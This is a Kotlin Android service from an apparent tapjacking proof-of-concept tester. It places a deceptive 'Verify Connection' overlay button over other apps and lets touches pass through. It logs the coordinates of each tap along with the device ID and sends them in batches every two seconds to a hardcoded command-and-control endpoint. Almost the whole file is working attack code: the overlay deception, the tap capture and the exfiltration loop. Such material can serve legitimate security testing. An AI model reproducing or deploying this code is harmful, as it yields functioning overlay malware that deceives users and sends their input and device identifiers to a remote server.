package ambank.gtr.tapjacktester

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.View.OnTouchListener
import android.view.WindowManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.Toast
import androidx.core.app.NotificationCompat
import java.net.HttpURLConnection
import java.net.URL
import java.io.OutputStreamWriter
import java.util.concurrent.Executors
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

class OverlayService : Service() {

    private lateinit var wm: WindowManager
    private var overlayView: FrameLayout? = null
    private var overlayVisible = false

    // Batching & Network components
    private val tapQueue = LinkedBlockingQueue<TapEvent>()
    private val c2Executor = Executors.newSingleThreadExecutor()
    private val batchScheduler = Executors.newScheduledThreadPool(1)
    private val C2_ENDPOINT = "http://192.168.100.250:3000/tj/report-taps"
    private var deviceId: String = ""

    data class TapEvent(val x: Int, val y: Int, val count: Int, val timestamp: Long)

    override fun onCreate() {
        super.onCreate()
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
        startForeground(NOTIF_ID, buildNotification())
        createOverlay()

        // Schedule batch transmission every 2 seconds
        batchScheduler.scheduleAtFixedRate({
            sendBatchToC2()
        }, 2, 2, TimeUnit.SECONDS)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_SHOW -> showOverlay()
            ACTION_HIDE -> hideOverlay()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        overlayView?.let {
            try { wm.removeView(it) } catch (_: Throwable) {}
        }
        // Flush remaining taps before service termination
        sendBatchToC2()
        batchScheduler.shutdownNow()
        c2Executor.shutdownNow()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createOverlay() {
        val elementWidth = 500
        val elementHeight = 180
        val offsetX = 0
        val offsetY = 400

        val overlay = FrameLayout(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            visibility = FrameLayout.GONE
        }

        val visualMaskElement = Button(this).apply {
            text = "Verify Connection"
            setBackgroundColor(Color.parseColor("#E6C23350"))
            setTextColor(Color.BLACK)
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        visualMaskElement.setOnTouchListener(object : OnTouchListener {
            private var localTapCount = 0

            override fun onTouch(v: View?, event: MotionEvent): Boolean {
                if (event.action == MotionEvent.ACTION_DOWN) {
                    localTapCount++
                    val rawX = event.rawX.toInt()
                    val rawY = event.rawY.toInt()
                    val timestamp = System.currentTimeMillis()

                    Toast.makeText(
                        applicationContext,
                        "PoC Target Hit! Tap #$localTapCount\nCoords: X=$rawX Y=$rawY",
                        Toast.LENGTH_SHORT
                    ).show()

                    Log.w(
                        "OfflineTapValidation",
                        "Target Intercept -> Tap detected at X: $rawX, Y: $rawY"
                    )

                    visualMaskElement.text = "TAP #$localTapCount VERIFIED"
                    visualMaskElement.setBackgroundColor(Color.parseColor("#FF3300"))

                    // Enqueue tap event for batch processing
                    tapQueue.offer(TapEvent(rawX, rawY, localTapCount, timestamp))
                }
                return false
            }
        })

        overlay.addView(visualMaskElement)

        val params = WindowManager.LayoutParams(
            elementWidth,
            elementHeight,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.CENTER
            x = offsetX
            y = offsetY
        }

        wm.addView(overlay, params)
        overlayView = overlay
    }

    private fun showOverlay() {
        overlayVisible = true
        overlayView?.visibility = FrameLayout.VISIBLE
    }

    private fun hideOverlay() {
        overlayVisible = false
        overlayView?.visibility = FrameLayout.GONE
    }

    private fun buildNotification(): Notification {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(
                NotificationChannel(
                    CHANNEL_ID,
                    "Tapjack Tester",
                    NotificationManager.IMPORTANCE_LOW
                )
            )
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("Tapjack Tester running")
            .setContentText("Targeted overlay active")
            .setOngoing(true)
            .build()
    }

    private fun sendBatchToC2() {
        val batch = mutableListOf<TapEvent>()
        tapQueue.drainTo(batch)
        if (batch.isEmpty()) return

        c2Executor.execute {
            var connection: HttpURLConnection? = null
            try {
                val url = URL(C2_ENDPOINT)
                connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doInput = true
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                // 1. Build guaranteed-valid JSON using org.json (built into Android)
                val tapsArray = org.json.JSONArray()
                for (tap in batch) {
                    tapsArray.put(org.json.JSONObject().apply {
                        put("x", tap.x)
                        put("y", tap.y)
                        put("count", tap.count)
                        put("ts", tap.timestamp) // Fixed: matches your data class
                    })
                }
                val payload = org.json.JSONObject().apply {
                    put("device_id", deviceId)
                    put("taps", tapsArray)
                }.toString()

                // 2. Explicitly set Content-Length to prevent Uvicorn HTTP parsing errors
                val payloadBytes = payload.toByteArray(Charsets.UTF_8)
                connection.setRequestProperty("Content-Length", payloadBytes.size.toString())

                // 3. Write payload
                connection.outputStream.use { os ->
                    os.write(payloadBytes)
                    os.flush()
                }

                val responseCode = connection.responseCode
                Log.d("C2Client", "Batch sent. Code: $responseCode, Taps: ${batch.size}")
            } catch (e: java.net.ConnectException) {
                Log.e("C2Client", "Connection refused. Verify IP/Port.", e)
            } catch (e: java.net.SocketTimeoutException) {
                Log.e("C2Client", "Timeout. Check routing/firewall.", e)
            } catch (e: Exception) {
                Log.e("C2Client", "C2 batch transmission failed", e)
            } finally {
                connection?.disconnect()
            }
        }
    }


    companion object {
        const val ACTION_SHOW = "overlay_show"
        const val ACTION_HIDE = "overlay_hide"
        private const val CHANNEL_ID = "tapjacktester"
        private const val NOTIF_ID = 1001
    }
}